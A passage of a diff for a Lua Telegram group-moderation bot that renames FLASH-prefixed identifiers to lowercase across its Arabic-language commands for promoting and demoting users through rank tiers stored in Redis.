 -------- Rem Onall
-if text ==('تنزيل مدير عام') and FLASH11(msg) then
+if text ==('تنزيل مدير عام') and flash11(msg) then
 function prom_reply(extra, result, success)
-FLASHdx1:srem(FLASH..'bot:onall:',result.sender_user_id_)
-Send_Options(msg,result.sender_user_id_,"reply","❅∫ تم تنزيله من المدراء𓍢\n❅∫ بواسطه ، "..renk_FLASH(msg).."\n")
+flashdx1:srem(flash..'bot:onall:',result.sender_user_id_)
+Send_Options(msg,result.sender_user_id_,"reply","❅∫ تم تنزيله من المدراء𓍢\n❅∫ بواسطه ، "..renk_flash(msg).."\n")
 end 
 if tonumber(tonumber(msg.reply_to_message_id_)) == 0 then
 else
 getMessage(msg.chat_id_, tonumber(msg.reply_to_message_id_),prom_reply)
 end end
-if text and text:match('^تنزيل مدير عام @(.*)') and FLASH11(msg) then
+if text and text:match('^تنزيل مدير عام @(.*)') and flash11(msg) then
 local username = text:match('^تنزيل مدير عام @(.*)')
 function promreply(extra,result,success)
 if result.id_ then
-FLASHdx1:srem(FLASH..'bot:onall:',result.id_)
-Send_Options(msg,result.id_,"reply","❅∫ تم تنزيله من المدراء𓍢\n❅∫ بواسطه ، "..renk_FLASH(msg).."\n")
+flashdx1:srem(flash..'bot:onall:',result.id_)
+Send_Options(msg,result.id_,"reply","❅∫ تم تنزيله من المدراء𓍢\n❅∫ بواسطه ، "..renk_flash(msg).."\n")
 else 
-FLASHdx(msg.chat_id_, msg.id_, 1, '*❅∫  المعرف غير صحيح*', 1, 'md')
+flashdx(msg.chat_id_, msg.id_, 1, '*❅∫  المعرف غير صحيح*', 1, 'md')
 end end 
 resolve_username(username,promreply)
 end end
---     By Developer FLASH     -- 
+--     By Developer flash     -- 
 -------- Set Moall
-if is_onall(msg.sender_user_id_, msg.chat_id_) and FLASH11(msg) then
+if is_onall(msg.sender_user_id_, msg.chat_id_) and flash11(msg) then
 if text ==('رفع ادمن عام') then
 function raf_reply(extra, result, success)
-FLASHdx1:sadd(FLASH..'bot:moall:',result.sender_user_id_)
-Send_Options(msg,result.sender_user_id_,"reply","❅∫ تم رفعه ادمن عام𓍢\n❅∫ بواسطه ، "..renk_FLASH(msg).."\n")
+flashdx1:sadd(flash..'bot:moall:',result.sender_user_id_)
+Send_Options(msg,result.sender_user_id_,"reply","❅∫ تم رفعه ادمن عام𓍢\n❅∫ بواسطه ، "..renk_flash(msg).."\n")
 end 
 if tonumber(tonumber(msg.reply_to_message_id_)) == 0 then
 else
 getMessage(msg.chat_id_, tonumber(msg.reply_to_message_id_),raf_reply)
 end end
-if text and text:match('^رفع ادمن عام @(.*)') and FLASH11(msg) then
+if text and text:match('^رفع ادمن عام @(.*)') and flash11(msg) then
 local username = text:match('^رفع ادمن عام @(.*)')
 function promreply(extra,result,success)
 if result.id_ then
-FLASHdx1:sadd(FLASH..'bot:moall:',result.id_)
-Send_Options(msg,result.id_,"reply","❅∫ تم رفعه ادمن عام𓍢\n❅∫ بواسطه ، "..renk_FLASH(msg).."\n")
+flashdx1:sadd(flash..'bot:moall:',result.id_)
+Send_Options(msg,result.id_,"reply","❅∫ تم رفعه ادمن عام𓍢\n❅∫ بواسطه ، "..renk_flash(msg).."\n")
 else 
-FLASHdx(msg.chat_id_, msg.id_, 1, '*❅∫  المعرف غير صحيح*', 1, 'md')
+flashdx(msg.chat_id_, msg.id_, 1, '*❅∫  المعرف غير صحيح*', 1, 'md')
 end end 
 resolve_username(username,promreply)
 end 
---     By Developer FLASH     -- 
+--     By Developer flash     -- 
 -------- Rem Moall
-if text ==('تنزيل ادمن عام') and FLASH11(msg) then
+if text ==('تنزيل ادمن عام') and flash11(msg) then
 function prom_reply(extra, result, success)
-FLASHdx1:srem(FLASH..'bot:moall:',result.sender_user_id_)
-Send_Options(msg,result.sender_user_id_,"reply","❅∫ تم تنزيله من الادمنيه𓍢\n❅∫ بواسطه ، "..renk_FLASH(msg).."\n")
+flashdx1:srem(flash..'bot:moall:',result.sender_user_id_)
+Send_Options(msg,result.sender_user_id_,"reply","❅∫ تم تنزيله من الادمنيه𓍢\n❅∫ بواسطه ، "..renk_flash(msg).."\n")
 end 
 if tonumber(tonumber(msg.reply_to_message_id_)) == 0 then
 else
 getMessage(msg.chat_id_, tonumber(msg.reply_to_message_id_),prom_reply)
 end end
-if text and text:match('^تنزيل ادمن عام @(.*)') and FLASH11(msg) then
+if text and text:match('^تنزيل ادمن عام @(.*)') and flash11(msg) then
 local username = text:match('^تنزيل ادمن عام @(.*)')
 function promreply(extra,result,success)
 if result.id_ then
-FLASHdx1:srem(FLASH..'bot:moall:',result.id_)
-Send_Options(msg,result.id_,"reply","❅∫ تم تنزيله من الادمنيه𓍢\n❅∫ بواسطه ، "..renk_FLASH(msg).."\n")
+flashdx1:srem(flash..'bot:moall:',result.id_)
+Send_Options(msg,result.id_,"reply","❅∫ تم تنزيله من الادمنيه𓍢\n❅∫ بواسطه ، "..renk_flash(msg).."\n")
 else 
-FLASHdx(msg.chat_id_, msg.id_, 1, '*❅∫  المعرف غير صحيح*', 1, 'md')
+flashdx(msg.chat_id_, msg.id_, 1, '*❅∫  المعرف غير صحيح*', 1, 'md')
 end end 
 resolve_username(username,promreply)
 end end
---     By Developer FLASH     -- 
+--     By Developer flash     -- 
 -------- Set Vipall
 if is_moall(msg.sender_user_id_, msg.chat_id_) then
-if text ==('رفع مميز عام') and FLASH11(msg) then
+if text ==('رفع مميز عام') and flash11(msg) then
 function raf_reply(extra, result, success)
-FLASHdx1:sadd(FLASH..'bot:vpall:',result.sender_user_id_)
-Send_Options(msg,result.sender_user_id_,"reply","❅∫ تم رفعه مميز عام𓍢\n❅∫ بواسطه ، "..renk_FLASH(msg).."\n")
+flashdx1:sadd(flash..'bot:vpall:',result.sender_user_id_)
+Send_Options(msg,result.sender_user_id_,"reply","❅∫ تم رفعه مميز عام𓍢\n❅∫ بواسطه ، "..renk_flash(msg).."\n")
 end 
 if tonumber(tonumber(msg.reply_to_message_id_)) == 0 then
 else
 getMessage(msg.chat_id_, tonumber(msg.reply_to_message_id_),raf_reply)
 end end
-if text and text:match('^رفع مميز عام @(.*)') and FLASH11(msg) then
+if text and text:match('^رفع مميز عام @(.*)') and flash11(msg) then
 local username = text:match('^رفع مميز عام @(.*)')
 function promreply(extra,result,success)
 if result.id_ then
-FLASHdx1:sadd(FLASH..'bot:vpall:',result.id_)
-Send_Options(msg,result.id_,"reply","❅∫ تم رفعه مميز عام𓍢\n❅∫ بواسطه ، "..renk_FLASH(msg).."\n")
+flashdx1:sadd(flash..'bot:vpall:',result.id_)
+Send_Options(msg,result.id_,"reply","❅∫ تم رفعه مميز عام𓍢\n❅∫ بواسطه ، "..renk_flash(msg).."\n")
 else 
-FLASHdx(msg.chat_id_, msg.id_, 1, '*❅∫  المعرف غير صحيح*', 1, 'md')
+flashdx(msg.chat_id_, msg.id_, 1, '*❅∫  المعرف غير صحيح*', 1, 'md')
 end end 
 resolve_username(username,promreply)
 end
---     By Developer FLASH     -- 
+--     By Developer flash     -- 
 -------- Rem Vipall
-if text ==('تنزيل مميز عام') and FLASH11(msg) then
+if text ==('تنزيل مميز عام') and flash11(msg) then
 function prom_reply(extra, result, success)
-FLASHdx1:srem(FLASH..'bot:vpall:',result.sender_user_id_)
-Send_Options(msg,result.sender_user_id_,"reply","❅∫ تم تنزيله من المميزين𓍢\n❅∫ بواسطه ، "..renk_FLASH(msg).."\n")
+flashdx1:srem(flash..'bot:vpall:',result.sender_user_id_)
+Send_Options(msg,result.sender_user_id_,"reply","❅∫ تم تنزيله من المميزين𓍢\n❅∫ بواسطه ، "..renk_flash(msg).."\n")
 end 
 if tonumber(tonumber(msg.reply_to_message_id_)) == 0 then
 else
 getMessage(msg.chat_id_, tonumber(msg.reply_to_message_id_),prom_reply)
 end end
-if text and text:match('^تنزيل مميز عام @(.*)') and FLASH11(msg) then
+if text and text:match('^تنزيل مميز عام @(.*)') and flash11(msg) then
 local username = text:match('^تنزيل مميز عام @(.*)')
 function promreply(extra,result,success)
 if result.id_ then
-FLASHdx1:srem(FLASH..'bot:vpall:',result.id_)
-Send_Options(msg,result.id_,"reply","❅∫ تم تنزيله من المميزين𓍢\n❅∫ بواسطه ، "..renk_FLASH(msg).."\n")
+flashdx1:srem(flash..'bot:vpall:',result.id_)
+Send_Options(msg,result.id_,"reply","❅∫ تم تنزيله من المميزين𓍢\n❅∫ بواسطه ، "..renk_flash(msg).."\n")
 else 
-FLASHdx(msg.chat_id_, msg.id_, 1, '*❅∫  المعرف غير صحيح*', 1, 'md')
+flashdx(msg.chat_id_, msg.id_, 1, '*❅∫  المعرف غير صحيح*', 1, 'md')
 end end 
 resolve_username(username,promreply)
 end end
---     By Developer FLASH     -- 
+--     By Developer flash     -- 
 -------- Set Monsh
 if is_vpall(msg.sender_user_id_, msg.chat_id_) then
-if text ==('رفع منشئ اساسي') and FLASH11(msg) then
+if text ==('رفع منشئ اساسي') and flash11(msg) then
 function raf_reply(extra, result, success)
-FLASHdx1:sadd(FLASH..'bot:monsh:'..msg.chat_id_,result.sender_user_id_)
-Send_Options(msg,result.sender_user_id_,"reply","❅∫ تم رفعه منشئ اساسي𓍢\n❅∫ بواسطه ، "..renk_FLASH(msg).."\n")
+flashdx1:sadd(flash..'bot:monsh:'..msg.chat_id_,result.sender_user_id_)
+Send_Options(msg,result.sender_user_id_,"reply","❅∫ تم رفعه منشئ اساسي𓍢\n❅∫ بواسطه ، "..renk_flash(msg).."\n")
 end 
 if tonumber(tonumber(msg.reply_to_message_id_)) == 0 then
 else
 getMessage(msg.chat_id_, tonumber(msg.reply_to_message_id_),raf_reply)
 end end
-if text and text:match('^رفع منشئ اساسي @(.*)') and FLASH11(msg) then
+if text and text:match('^رفع منشئ اساسي @(.*)') and flash11(msg) then
 local username = text:match('^رفع منشئ اساسي @(.*)')
 function promreply(extra,result,success)
 if result.id_ then
-FLASHdx1:sadd(FLASH..'bot:monsh:'..msg.chat_id_,result.id_)
-Send_Options(msg,result.id_,"reply","❅∫ تم رفعه منشئ اساسي𓍢\n❅∫ بواسطه ، "..renk_FLASH(msg).."\n")
+flashdx1:sadd(flash..'bot:monsh:'..msg.chat_id_,result.id_)
+Send_Options(msg,result.id_,"reply","❅∫ تم رفعه منشئ اساسي𓍢\n❅∫ بواسطه ، "..renk_flash(msg).."\n")
 else 
-FLASHdx(msg.chat_id_, msg.id_, 1, '*❅∫  المعرف غير صحيح*', 1, 'md')
+flashdx(msg.chat_id_, msg.id_, 1, '*❅∫  المعرف غير صحيح*', 1, 'md')
 end end 
 resolve_username(username,promreply)
 end
---     By Developer FLASH     -- 
+--     By Developer flash     -- 
 -------- Rem Monsh
-if text ==('تنزيل منشئ اساسي') and FLASH11(msg) then
+if text ==('تنزيل منشئ اساسي') and flash11(msg) then
 function prom_reply(extra, result, success)
-FLASHdx1:srem(FLASH..'bot:monsh:'..msg.chat_id_,result.sender_user_id_)
-Send_Options(msg,result.sender_user_id_,"reply","❅∫ تم تنزيله من الاساسيين𓍢\n❅∫ بواسطه ، "..renk_FLASH(msg).."\n")
+flashdx1:srem(flash..'bot:monsh:'..msg.chat_id_,result.sender_user_id_)
+Send_Options(msg,result.sender_user_id_,"reply","❅∫ تم تنزيله من الاساسيين𓍢\n❅∫ بواسطه ، "..renk_flash(msg).."\n")
 end 
 if tonumber(tonumber(msg.reply_to_message_id_)) == 0 then
 else
 getMessage(msg.chat_id_, tonumber(msg.reply_to_message_id_),prom_reply)
 end end
-if text and text:match('^تنزيل منشئ اساسي @(.*)') and FLASH11(msg) then
+if text and text:match('^تنزيل منشئ اساسي @(.*)') and flash11(msg) then
 local username = text:match('^تنزيل منشئ اساسي @(.*)')
 function promreply(extra,result,success)
 if result.id_ then
-FLASHdx1:srem(FLASH..'bot:monsh:'..msg.chat_id_,result.id_)
-Send_Options(msg,result.id_,"reply","❅∫ تم تنزيله من الاساسيين𓍢\n❅∫ بواسطه ، "..renk_FLASH(msg).."\n")
+flashdx1:srem(flash..'bot:monsh:'..msg.chat_id_,result.id_)
+Send_Options(msg,result.id_,"reply","❅∫ تم تنزيله من الاساسيين𓍢\n❅∫ بواسطه ، "..renk_flash(msg).."\n")
 else 
-FLASHdx(msg.chat_id_, msg.id_, 1, '*❅∫  المعرف غير صحيح*', 1, 'md')
+flashdx(msg.chat_id_, msg.id_, 1, '*❅∫  المعرف غير صحيح*', 1, 'md')
 end end 
 resolve_username(username,promreply)
 end end
---     By Developer FLASH     -- 
+--     By Developer flash     -- 
 -------- Set Monsh2
 if is_monsh(msg.sender_user_id_, msg.chat_id_) then
-if text ==('رفع منشئ') and FLASH11(msg) then
+if text ==('رفع منشئ') and flash11(msg) then
 function raf_reply(extra, result, success)
-FLASHdx1:sadd(FLASH..'bot:monsh2:'..msg.chat_id_,result.sender_user_id_)
-Send_Options(msg,result.sender_user_id_,"reply","❅∫ تم رفعه منشئ𓍢\n❅∫ بواسطه ، "..renk_FLASH(msg).."\n")
+flashdx1:sadd(flash..'bot:monsh2:'..msg.chat_id_,result.sender_user_id_)
+Send_Options(msg,result.sender_user_id_,"reply","❅∫ تم رفعه منشئ𓍢\n❅∫ بواسطه ، "..renk_flash(msg).."\n")
 end 
 if tonumber(tonumber(msg.reply_to_message_id_)) == 0 then
 else
 getMessage(msg.chat_id_, tonumber(msg.reply_to_message_id_),raf_reply)
 end end
-if text and text:match('^رفع منشئ @(.*)') and FLASH11(msg) then
+if text and text:match('^رفع منشئ @(.*)') and flash11(msg) then
 local username = text:match('^رفع منشئ @(.*)')
 function promreply(extra,result,success)
 if result.id_ then
-FLASHdx1:sadd(FLASH..'bot:monsh2:'..msg.chat_id_,result.id_)
-Send_Options(msg,result.id_,"reply","❅∫ ❅∫ تم رفعه منشئ𓍢\n❅∫ بواسطه ، "..renk_FLASH(msg).."\n")
+flashdx1:sadd(flash..'bot:monsh2:'..msg.chat_id_,result.id_)
+Send_Options(msg,result.id_,"reply","❅∫ ❅∫ تم رفعه منشئ𓍢\n❅∫ بواسطه ، "..renk_flash(msg).."\n")
 else 
-FLASHdx(msg.chat_id_, msg.id_, 1, '*❅∫  المعرف غير صحيح*', 1, 'md')
+flashdx(msg.chat_id_, msg.id_, 1, '*❅∫  المعرف غير صحيح*', 1, 'md')
 end end 
 resolve_username(username,promreply)
 end
---     By Developer FLASH     -- 
+--     By Developer flash     -- 
 -------- Rem Monsh2
-if text ==('تنزيل منشئ') and FLASH11(msg) then
+if text ==('تنزيل منشئ') and flash11(msg) then
 function prom_reply(extra, result, success)
-FLASHdx1:srem(FLASH..'bot:monsh2:'..msg.chat_id_,result.sender_user_id_)
-Send_Options(msg,result.sender_user_id_,"reply","❅∫ تم تنزيله من المنشئين𓍢\n❅∫ بواسطه ، "..renk_FLASH(msg).."\n")
+flashdx1:srem(flash..'bot:monsh2:'..msg.chat_id_,result.sender_user_id_)
+Send_Options(msg,result.sender_user_id_,"reply","❅∫ تم تنزيله من المنشئين𓍢\n❅∫ بواسطه ، "..renk_flash(msg).."\n")
 end 
 if tonumber(tonumber(msg.reply_to_message_id_)) == 0 then
 else
 getMessage(msg.chat_id_, tonumber(msg.reply_to_message_id_),prom_reply)
 end end
-if text and text:match('^تنزيل منشئ @(.*)') and FLASH11(msg) then
+if text and text:match('^تنزيل منشئ @(.*)') and flash11(msg) then
 local username = text:match('^تنزيل منشئ @(.*)')
 function promreply(extra,result,success)
 if result.id_ then
-FLASHdx1:srem(FLASH..'bot:monsh2:'..msg.chat_id_,result.id_)
-Send_Options(msg,result.id_,"reply","❅∫ تم تنزيله من المنشئين𓍢\n❅∫ بواسطه ، "..renk_FLASH(msg).."\n")
+flashdx1:srem(flash..'bot:monsh2:'..msg.chat_id_,result.id_)
+Send_Options(msg,result.id_,"reply","❅∫ تم تنزيله من المنشئين𓍢\n❅∫ بواسطه ، "..renk_flash(msg).."\n")
 else 
-FLASHdx(msg.chat_id_, msg.id_, 1, '*❅∫  المعرف غير صحيح*', 1, 'md')
+flashdx(msg.chat_id_, msg.id_, 1, '*❅∫  المعرف غير صحيح*', 1, 'md')
 end end 
 resolve_username(username,promreply)
 end end
---     By Developer FLASH     -- 
+--     By Developer flash     -- 
 -------- Set Owner
 if is_monsh2(msg.sender_user_id_, msg.chat_id_) then
-if text ==('رفع مدير') and FLASH11(msg) then
+if text ==('رفع مدير') and flash11(msg) then
 function prom_reply(extra, result, success)
-FLASHdx1:sadd(FLASH..'bot:owners:'..msg.chat_id_,result.sender_user_id_)
-Send_Options(msg,result.sender_user_id_,"reply","❅∫ تم رفعه مدير𓍢\n❅∫ بواسطه ، "..renk_FLASH(msg).."\n")
+flashdx1:sadd(flash..'bot:owners:'..msg.chat_id_,result.sender_user_id_)
+Send_Options(msg,result.sender_user_id_,"reply","❅∫ تم رفعه مدير𓍢\n❅∫ بواسطه ، "..renk_flash(msg).."\n")
 end  
 if tonumber(tonumber(msg.reply_to_message_id_)) == 0 then
 else
 getMessage(msg.chat_id_, tonumber(msg.reply_to_message_id_),prom_reply)
 end end
-if text and text:match('^رفع مدير @(.*)') and FLASH11(msg) then
+if text and text:match('^رفع مدير @(.*)') and flash11(msg) then
 local username = text:match('^رفع مدير @(.*)')
 function promreply(extra,result,success)
 if result.id_ then
-FLASHdx1:sadd(FLASH..'bot:owners:'..msg.chat_id_,result.id_)
-Send_Options(msg,result.id_,"reply","❅∫ تم رفعه مدير𓍢\n❅∫ بواسطه ، "..renk_FLASH(msg).."\n")
+flashdx1:sadd(flash..'bot:owners:'..msg.chat_id_,result.id_)
+Send_Options(msg,result.id_,"reply","❅∫ تم رفعه مدير𓍢\n❅∫ بواسطه ، "..renk_flash(msg).."\n")
 else 
-FLASHdx(msg.chat_id_, msg.id_, 1, '*❅∫  المعرف غير صحيح*', 1, 'md')
+flashdx(msg.chat_id_, msg.id_, 1, '*❅∫  المعرف غير صحيح*', 1, 'md')
 end end 
 resolve_username(username,promreply)
 end
---     By Developer FLASH     -- 
+--     By Developer flash     -- 
 -------- Rem Owner
-if text ==('تنزيل مدير') and FLASH11(msg) then
+if text ==('تنزيل مدير') and flash11(msg) then
 function prom_reply(extra, result, success)
-FLASHdx1:srem(FLASH..'bot:owners:'..msg.chat_id_,result.sender_user_id_)
-Send_Options(msg,result.sender_user_id_,"reply","❅∫ تم تنزيله من المدراء𓍢\n❅∫ بواسطه ، "..renk_FLASH(msg).."\n")
+flashdx1:srem(flash..'bot:owners:'..msg.chat_id_,result.sender_user_id_)
+Send_Options(msg,result.sender_user_id_,"reply","❅∫ تم تنزيله من المدراء𓍢\n❅∫ بواسطه ، "..renk_flash(msg).."\n")
 end 
 if tonumber(tonumber(msg.reply_to_message_id_)) == 0 then
 else
 getMessage(msg.chat_id_, tonumber(msg.reply_to_message_id_),prom_reply)
 end end
-if text and text:match('^تنزيل مدير @(.*)') and FLASH11(msg) then
+if text and text:match('^تنزيل مدير @(.*)') and flash11(msg) then
 local username = text:match('^تنزيل مدير @(.*)')
 function promreply(extra,result,success)
 if result.id_ then
-FLASHdx1:srem(FLASH..'bot:owners:'..msg.chat_id_,result.id_)
-Send_Options(msg,result.id_,"reply","❅∫ تم تنزيله من المدراء𓍢\n❅∫ بواسطه ، "..renk_FLASH(msg).."\n")
+flashdx1:srem(flash..'bot:owners:'..msg.chat_id_,result.id_)
+Send_Options(msg,result.id_,"reply","❅∫ تم تنزيله من المدراء𓍢\n❅∫ بواسطه ، "..renk_flash(msg).."\n")
 else 
-FLASHdx(msg.chat_id_, msg.id_, 1, '*❅∫  المعرف غير صحيح*', 1, 'md')
+flashdx(msg.chat_id_, msg.id_, 1, '*❅∫  المعرف غير صحيح*', 1, 'md')
 end end 
 resolve_username(username,promreply)
 end end
---     By Developer FLASH     -- 
+--     By Developer flash     -- 
 -------- Set Momod
 if is_owner(msg.sender_user_id_, msg.chat_id_) then
-if text ==('رفع ادمن') and FLASH11(msg) then
+if text ==('رفع ادمن') and flash11(msg) then
 function prom_reply(extra, result, success)
-FLASHdx1:sadd(FLASH..'bot:momod:'..msg.chat_id_,result.sender_user_id_)
-Send_Options(msg,result.sender_user_id_,"reply","❅∫ تم رفعه ادمن𓍢\n❅∫ بواسطه ، "..renk_FLASH(msg).."\n")
+flashdx1:sadd(flash..'bot:momod:'..msg.chat_id_,result.sender_user_id_)
+Send_Options(msg,result.sender_user_id_,"reply","❅∫ تم رفعه ادمن𓍢\n❅∫ بواسطه ، "..renk_flash(msg).."\n")
 end 
 if tonumber(tonumber(msg.reply_to_message_id_)) == 0 then
 else
 getMessage(msg.chat_id_, tonumber(msg.reply_to_message_id_),prom_reply)
 end end
-if text and text:match('^رفع ادمن @(.*)') and FLASH11(msg) then
+if text and text:match('^رفع ادمن @(.*)') and flash11(msg) then
 local username = text:match('^رفع ادمن @(.*)')
 function promreply(extra,result,success)
 if result.id_ then
-FLASHdx1:sadd(FLASH..'bot:momod:'..msg.chat_id_,result.id_)
-Send_Options(msg,result.id_,"reply","❅∫ تم رفعه ادمن𓍢\n❅∫ بواسطه ، "..renk_FLASH(msg).."\n")
+flashdx1:sadd(flash..'bot:momod:'..msg.chat_id_,result.id_)
+Send_Options(msg,result.id_,"reply","❅∫ تم رفعه ادمن𓍢\n❅∫ بواسطه ، "..renk_flash(msg).."\n")
 else 
-FLASHdx(msg.chat_id_, msg.id_, 1, '*❅∫  المعرف غير صحيح*', 1, 'md')
+flashdx(msg.chat_id_, msg.id_, 1, '*❅∫  المعرف غير صحيح*', 1, 'md')
 end end 
 resolve_username(username,promreply)
 end
---     By Developer FLASH     -- 
+--     By Developer flash     -- 
 -------- Rem Momod
-if text ==('تنزيل ادمن') and FLASH11(msg) then
+if text ==('تنزيل ادمن') and flash11(msg) then
 function prom_reply(extra, result, success)
-FLASHdx1:srem(FLASH..'bot:momod:'..msg.chat_id_,result.sender_user_id_)
-Send_Options(msg,result.sender_user_id_,"reply","❅∫ تم تنزيله من الادمنيه𓍢\n❅∫ بواسطه ، "..renk_FLASH(msg).."\n")
+flashdx1:srem(flash..'bot:momod:'..msg.chat_id_,result.sender_user_id_)
+Send_Options(msg,result.sender_user_id_,"reply","❅∫ تم تنزيله من الادمنيه𓍢\n❅∫ بواسطه ، "..renk_flash(msg).."\n")
 end 
 if tonumber(tonumber(msg.reply_to_message_id_)) == 0 then
 else
 getMessage(msg.chat_id_, tonumber(msg.reply_to_message_id_),prom_reply)
 end end
-if text and text:match('^تنزيل ادمن @(.*)') and FLASH11(msg) then
+if text and text:match('^تنزيل ادمن @(.*)') and flash11(msg) then
 local username = text:match('^تنزيل ادمن @(.*)')
 function promreply(extra,result,success)
 if result.id_ then
-FLASHdx1:srem(FLASH..'bot:momod:'..msg.chat_id_,result.id_)
-Send_Options(msg,result.id_,"reply","❅∫ تم تنزيله من الادمنيه𓍢\n❅∫ بواسطه ، "..renk_FLASH(msg).."\n")
+flashdx1:srem(flash..'bot:momod:'..msg.chat_id_,result.id_)
+Send_Options(msg,result.id_,"reply","❅∫ تم تنزيله من الادمنيه𓍢\n❅∫ بواسطه ، "..renk_flash(msg).."\n")
 else 
-FLASHdx(msg.chat_id_, msg.id_, 1, '*❅∫  المعرف غير صحيح*', 1, 'md')
+flashdx(msg.chat_id_, msg.id_, 1, '*❅∫  المعرف غير صحيح*', 1, 'md')
 end end 
 resolve_username(username,promreply)
 end end
---     By Developer FLASH     -- 
+--     By Developer flash     -- 
 -------- Set Vipmem
 if is_momod(msg.sender_user_id_, msg.chat_id_) then
-if text ==('رفع مميز') and FLASH11(msg) then
+if text ==('رفع مميز') and flash11(msg) then
 function prom_reply(extra, result, success)
-FLASHdx1:sadd(FLASH..'bot:vipmem:'..msg.chat_id_,result.sender_user_id_)
-Send_Options(msg,result.sender_user_id_,"reply","❅∫ تم رفعه مميز𓍢\n❅∫ بواسطه ، "..renk_FLASH(msg).."\n")
+flashdx1:sadd(flash..'bot:vipmem:'..msg.chat_id_,result.sender_user_id_)
+Send_Options(msg,result.sender_user_id_,"reply","❅∫ تم رفعه مميز𓍢\n❅∫ بواسطه ، "..renk_flash(msg).."\n")
 end 
 if tonumber(tonumber(msg.reply_to_message_id_)) == 0 then
 else
 getMessage(msg.chat_id_, tonumber(msg.reply_to_message_id_),prom_reply)
 end end
-if text and text:match('^رفع مميز @(.*)') and FLASH11(msg) then
+if text and text:match('^رفع مميز @(.*)') and flash11(msg) then
 local username = text:match('^رفع مميز @(.*)')
 function promreply(extra,result,success)
 if result.id_ then
-FLASHdx1:sadd(FLASH..'bot:vipmem:'..msg.chat_id_,result.id_)
-Send_Options(msg,result.id_,"reply","❅∫ تم رفعه مميز𓍢\n❅∫ بواسطه ، "..renk_FLASH(msg).."\n")
+flashdx1:sadd(flash..'bot:vipmem:'..msg.chat_id_,result.id_)
+Send_Options(msg,result.id_,"reply","❅∫ تم رفعه مميز𓍢\n❅∫ بواسطه ، "..renk_flash(msg).."\n")
 else 
-FLASHdx(msg.chat_id_, msg.id_, 1, '*❅∫  المعرف غير صحيح*', 1, 'md')
+flashdx(msg.chat_id_, msg.id_, 1, '*❅∫  المعرف غير صحيح*', 1, 'md')
 end end 
 resolve_username(username,promreply)
 end
---     By Developer FLASH     -- 
+--     By Developer flash     -- 
 -------- Rem Vipmem
-if text ==('تنزيل مميز') and FLASH11(msg) then
+if text ==('تنزيل مميز') and flash11(msg) then
 function prom_reply(extra, result, success)
-FLASHdx1:srem(FLASH..'bot:vipmem:'..msg.chat_id_,result.sender_user_id_)
-Send_Options(msg,result.sender_user_id_,"reply","❅∫ تم تنزيله من المميزين𓍢\n❅∫ بواسطه ، "..renk_FLASH(msg).."\n")
+flashdx1:srem(flash..'bot:vipmem:'..msg.chat_id_,result.sender_user_id_)
+Send_Options(msg,result.sender_user_id_,"reply","❅∫ تم تنزيله من المميزين𓍢\n❅∫ بواسطه ، "..renk_flash(msg).."\n")
 end 
 if tonumber(tonumber(msg.reply_to_message_id_)) == 0 then
 else
 getMessage(msg.chat_id_, tonumber(msg.reply_to_message_id_),prom_reply)
 end end
-if text and text:match('^تنزيل مميز @(.*)') and FLASH11(msg) then
+if text and text:match('^تنزيل مميز @(.*)') and flash11(msg) then
 local username = text:match('^تنزيل مميز @(.*)')
 function promreply(extra,result,success)
 if result.id_ then
-FLASHdx1:srem(FLASH..'bot:vipmem:'..msg.chat_id_,result.id_)
-Send_Options(msg,result.id_,"reply","❅∫ تم تنزيله من المميزين𓍢\n❅∫ بواسطه ، "..renk_FLASH(msg).."\n")
+flashdx1:srem(flash..'bot:vipmem:'..msg.chat_id_,result.id_)
+Send_Options(msg,result.id_,"reply","❅∫ تم تنزيله من المميزين𓍢\n❅∫ بواسطه ، "..renk_flash(msg).."\n")
 else 
-FLASHdx(msg.chat_id_, msg.id_, 1, '*❅∫  المعرف غير صحيح*', 1, 'md')
+flashdx(msg.chat_id_, msg.id_, 1, '*❅∫  المعرف غير صحيح*', 1, 'md')
 end end 
 resolve_username(username,promreply)
 end end 
---     By Developer FLASH     -- 
-if text == ("تنزيل الكل") and msg.reply_to_message_id_ ~= 0 and is_owner(msg.sender_user_id_, msg.chat_id_) and FLASH11(msg) then 
+--     By Developer flash     -- 
+if text == ("تنزيل الكل") and msg.reply_to_message_id_ ~= 0 and is_owner(msg.sender_user_id_, msg.chat_id_) and flash11(msg) then 
 function promote_by_reply(extra, result, success)
 if is_leaderid(result.sender_user_id_) == true then
-FLASHdx(msg.chat_id_, msg.id_, 1, "❅∫ لا يمكنك تنزيل المطور الاساسي ", 1, 'md')
+flashdx(msg.chat_id_, msg.id_, 1, "❅∫ لا يمكنك تنزيل المطور الاساسي ", 1, 'md')
 return false 
 end
-if FLASHdx1:sismember(FLASH..'bot:admins:',result.sender_user_id_) then
+if flashdx1:sismember(flash..'bot:admins:',result.sender_user_id_) then
 sudo3 = 'مطور ثالث ، ' else sudo3 = '' end
-if FLASHdx1:sismember(FLASH..'bot:onall:',result.sender_user_id_) then
+if flashdx1:sismember(flash..'bot:onall:',result.sender_user_id_) then
 onall = 'مدير عام ، ' else onall = '' end
-if FLASHdx1:sismember(FLASH..'bot:moall:',result.sender_user_id_) then
+if flashdx1:sismember(flash..'bot:moall:',result.sender_user_id_) then
 moall = 'ادمن عام ، ' else moall = '' end
-if FLASHdx1:sismember(FLASH..'bot:vpall:',result.sender_user_id_) then
+if flashdx1:sismember(flash..'bot:vpall:',result.sender_user_id_) then
 vpall = 'مميز عام ، ' else vpall = '' end
-if FLASHdx1:sismember(FLASH..'bot:monsh:'..msg.chat_id_, result.sender_user_id_) then
+if flashdx1:sismember(flash..'bot:monsh:'..msg.chat_id_, result.sender_user_id_) then
 monsh = 'منشئ اساسي ،  ' else monsh = '' end
-if FLASHdx1:sismember(FLASH..'bot:monsh2:'..msg.chat_id_, result.sender_user_id_) then
+if flashdx1:sismember(flash..'bot:monsh2:'..msg.chat_id_, result.sender_user_id_) then
 monsh2 = 'منشئ ، ' else monsh2 = '' end 
-if FLASHdx1:sismember(FLASH..'bot:owners:'..msg.chat_id_, result.sender_user_id_) then
+if flashdx1:sismember(flash..'bot:owners:'..msg.chat_id_, result.sender_user_id_) then
 owner = 'مدير ، ' else owner = '' end
-if FLASHdx1:sismember(FLASH..'bot:momod:'..msg.chat_id_, result.sender_user_id_) then
+if flashdx1:sismember(flash..'bot:momod:'..msg.chat_id_, result.sender_user_id_) then
 momod = 'ادمن ، ' else momod = '' end
-if FLASHdx1:sismember(FLASH..'bot:vipmem:'..msg.chat_id_, result.sender_user_id_) then
+if flashdx1:sismember(flash..'bot:vipmem:'..msg.chat_id_, result.sender_user_id_) then
 vipmem = 'مميز' else vipmem = ''
 end
 if dxdx(result.sender_user_id_,msg.chat_id_) ~= false then
